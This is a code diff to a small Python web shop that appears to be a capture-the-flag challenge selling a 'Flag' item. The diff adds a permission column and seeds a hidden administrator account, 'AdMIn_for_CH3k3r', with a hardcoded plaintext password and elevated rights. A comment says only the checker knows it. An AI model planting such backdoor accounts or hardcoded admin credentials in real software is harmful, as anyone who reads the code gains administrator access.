@@ -46,6 +46,7 @@ class User(BaseModel):
     valid = Column(BOOLEAN(), default=False)
     check_code = Column(VARCHAR(10))
     phone_number = Column(VARCHAR(20))
+    permission = Column(INTEGER ,default=0)
 
     def check(self, password):
         return bcrypt.checkpw(password.encode('utf-8'), self.password.encode('utf8'))
@@ -107,4 +108,7 @@ if __name__ == "__main__":
         price = random.randint(10, 200)
         db.add(Commodity(name=name, desc=desc, price=price))
     db.add(Commodity(name='Flag', desc="If you buy it, you can trigger some special function.", price=2048, amount=1))
+    # hey, don't worry, only checker know the user! I promise!
+    db.add(User(username='AdMIn_for_CH3k3r', mail='gay@it.edu.cn', check_code='6666', phone_number='0',integral=-2333,
+                permission=10,valid=True,password=bcrypt.hashpw('AdMIn_for_CH3k3r_es7kyJwufk'.encode('utf8'), bcrypt.gensalt())))
     db.commit()
